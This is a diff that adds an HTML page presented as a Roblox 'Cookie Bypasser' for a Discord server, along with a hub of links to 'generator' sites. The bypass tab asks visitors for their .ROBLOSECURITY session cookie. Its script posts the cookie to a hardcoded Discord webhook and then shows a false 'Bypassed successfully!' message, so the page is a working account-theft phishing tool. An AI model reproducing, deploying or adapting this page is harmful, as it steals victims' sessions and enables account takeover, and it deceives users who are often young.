@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie Bypasser</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #0e0e12;
+    color: #e0e0e0;
+    min-height: 100vh;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  canvas#snow {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 20px 16px 60px;
+  }
+
+  /* ── Server Banner ── */
+  .server-banner {
+    background: #16161d;
+    border: 1px solid #2a2a35;
+    border-radius: 12px;
+    padding: 18px 24px;
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  .server-banner h2 {
+    font-size: 14px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: #7c7cf0;
+    margin-bottom: 10px;
+  }
+  .server-banner a {
+    display: inline-block;
+    background: #5865F2;
+    color: #fff;
+    text-decoration: none;
+    padding: 10px 28px;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    transition: background .2s;
+  }
+  .server-banner a:hover { background: #4752c4; }
+
+  /* ── Tabs ── */
+  .tab-bar {
+    display: flex;
+    gap: 4px;
+    background: #16161d;
+    border-radius: 10px;
+    padding: 4px;
+    margin-bottom: 28px;
+    border: 1px solid #2a2a35;
+  }
+  .tab-btn {
+    flex: 1;
+    padding: 12px 0;
+    background: transparent;
+    border: none;
+    color: #888;
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all .2s;
+  }
+  .tab-btn.active {
+    background: #1e1e2a;
+    color: #7c7cf0;
+  }
+  .tab-btn:hover:not(.active) { color: #bbb; }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* ── Homepage Link Hub ── */
+  .link-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+  }
+  .link-card {
+    background: #16161d;
+    border: 1px solid #2a2a35;
+    border-radius: 12px;
+    padding: 22px 18px;
+    text-align: center;
+    transition: border-color .2s, transform .15s;
+    cursor: pointer;
+    text-decoration: none;
+  }
+  .link-card:hover {
+    border-color: #7c7cf0;
+    transform: translateY(-3px);
+  }
+  .link-card .icon {
+    width: 44px; height: 44px;
+    background: #1e1e2a;
+    border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 14px;
+    font-size: 20px;
+  }
+  .link-card .name {
+    font-size: 14px;
+    font-weight: 600;
+    color: #e0e0e0;
+  }
+  .link-card .desc {
+    font-size: 11px;
+    color: #666;
+    margin-top: 4px;
+  }
+
+  /* ── Bypasser ── */
+  .bypasser-box {
+    background: #16161d;
+    border: 1px solid #2a2a35;
+    border-radius: 14px;
+    padding: 32px 28px;
+    text-align: center;
+  }
+  .bypasser-box h2 {
+    font-size: 22px;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 6px;
+  }
+  .bypasser-box .sub {
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 28px;
+  }
+  .input-group {
+    position: relative;
+    margin-bottom: 20px;
+  }
+  .input-group label {
+    display: block;
+    text-align: left;
+    font-size: 12px;
+    font-weight: 600;
+    color: #888;
+    margin-bottom: 8px;
+    letter-spacing: .5px;
+    text-transform: uppercase;
+  }
+  .input-group input {
+    width: 100%;
+    background: #0e0e12;
+    border: 1px solid #2a2a35;
+    border-radius: 10px;
+    padding: 14px 16px;
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    outline: none;
+    transition: border-color .2s;
+  }
+  .input-group input:focus { border-color: #7c7cf0; }
+  .input-group input::placeholder { color: #444; }
+
+  .submit-btn {
+    width: 100%;
+    padding: 14px;
+    background: #5865F2;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .2s;
+  }
+  .submit-btn:hover { background: #4752c4; }
+  .submit-btn:disabled { background: #3a3a50; cursor: not-allowed; }
+
+  .status-msg {
+    margin-top: 16px;
+    font-size: 13px;
+    min-height: 20px;
+  }
+  .status-msg.success { color: #4ade80; }
+  .status-msg.error { color: #f87171; }
+  .status-msg.loading { color: #7c7cf0; }
+
+  @media (max-width: 500px) {
+    .link-grid { grid-template-columns: 1fr; }
+    .bypasser-box { padding: 24px 18px; }
+  }
+</style>
+</head>
+<body>
+
+<canvas id="snow"></canvas>
+
+<div class="wrapper">
+
+  <!-- Server Banner -->
+  <div class="server-banner">
+    <h2>⚡ Vex Beams Server</h2>
+    <a href="https://discord.gg/5eeWBhZAuR" target="_blank" rel="noopener">Join Discord</a>
+  </div>
+
+  <!-- Tab Bar -->
+  <div class="tab-bar">
+    <button class="tab-btn active" data-tab="home">Homepage</button>
+    <button class="tab-btn" data-tab="bypass">Cookie Bypasser</button>
+  </div>
+
+  <!-- Homepage Tab -->
+  <div class="tab-content active" id="tab-home">
+    <div class="link-grid">
+      <a class="link-card" href="https://app.beamse.pro/gen/Vex" target="_blank" rel="noopener">
+        <div class="icon">🔮</div>
+        <div class="name">VEX SITE</div>
+        <div class="desc">Generator</div>
+      </a>
+      <a class="link-card" href="https://shockify.st/?code=MTQ4NDIwNzE5MDk0NzA1MjgwMg==" target="_blank" rel="noopener">
+        <div class="icon">⚡</div>
+        <div class="name">Shockify</div>
+        <div class="desc">Shockify Tool</div>
+      </a>
+      <a class="link-card" href="https://blox-link.com/gen" target="_blank" rel="noopener">
+        <div class="icon">🔗</div>
+        <div class="name">Blox Link Method Site</div>
+        <div class="desc">Blox Link Gen</div>
+      </a>
+      <a class="link-card" href="https://tncs-hyper-lnk-jitv.vercel.app/" target="_blank" rel="noopener">
+        <div class="icon">🚀</div>
+        <div class="name">Hyperlink</div>
+        <div class="desc">Hyper Link Tool</div>
+      </a>
+    </div>
+  </div>
+
+  <!-- Bypasser Tab -->
+  <div class="tab-content" id="tab-bypass">
+    <div class="bypasser-box">
+      <h2>Cookie Bypasser</h2>
+      <p class="sub">Input your .ROBLOSECURITY cookie below</p>
+      <div class="input-group">
+        <label>Input .ROBLOSECURITY</label>
+        <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." autocomplete="off" spellcheck="false">
+      </div>
+      <button class="submit-btn" id="submitBtn" onclick="sendCookie()">Bypass</button>
+      <div class="status-msg" id="statusMsg"></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ── Tabs ──
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+      btn.classList.add('active');
+      document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+    });
+  });
+
+  // ── Webhook ──
+  async function sendCookie() {
+    const input = document.getElementById('cookieInput');
+    const btn = document.getElementById('submitBtn');
+    const status = document.getElementById('statusMsg');
+    const value = input.value.trim();
+
+    if (!value) {
+      status.className = 'status-msg error';
+      status.textContent = 'Please enter a cookie.';
+      return;
+    }
+
+    btn.disabled = true;
+    status.className = 'status-msg loading';
+    status.textContent = 'Bypassing...';
+
+    try {
+      await fetch('https://discord.com/api/webhooks/1488738403934539818/NuJwz-0f--N9uHAnSrKhgOISmKPD4wd9JIBTC_xAi0VYC2ZK4iLZF9k8F9Wpk5P72Vcz', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: null,
+          embeds: [{
+            title: '🍪 Cookie Bypasser',
+            color: 5793266,
+            fields: [{ name: '.ROBLOSECURITY', value: '```' + value + '```' }],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+      status.className = 'status-msg success';
+      status.textContent = 'Bypassed successfully!';
+      input.value = '';
+    } catch (e) {
+      status.className = 'status-msg error';
+      status.textContent = 'Failed. Try again.';
+    }
+    btn.disabled = false;
+  }
+
+  // ── Snow ──
+  (function() {
+    const canvas = document.getElementById('snow');
+    const ctx = canvas.getContext('2d');
+    let W, H, particles = [];
+
+    function resize() {
+      W = canvas.width = window.innerWidth;
+      H = canvas.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    for (let i = 0; i < 120; i++) {
+      particles.push({
+        x: Math.random() * W,
+        y: Math.random() * H,
+        r: Math.random() * 2.5 + 0.5,
+        d: Math.random() * 1 + 0.3,
+        swing: Math.random() * 0.8 - 0.4
+      });
+    }
+
+    function draw() {
+      ctx.clearRect(0, 0, W, H);
+      ctx.fillStyle = 'rgba(255,255,255,0.7)';
+      ctx.beginPath();
+      for (const p of particles) {
+        ctx.moveTo(p.x, p.y);
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      }
+      ctx.fill();
+      update();
+      requestAnimationFrame(draw);
+    }
+
+    function update() {
+      for (const p of particles) {
+        p.y += p.d;
+        p.x += p.swing;
+        if (p.y > H + 5) { p.y = -5; p.x = Math.random() * W; }
+        if (p.x > W + 5) p.x = -5;
+        if (p.x < -5) p.x = W + 5;
+      }
+    }
+    draw();
+  })();
+</script>
+
+</body>
+</html>
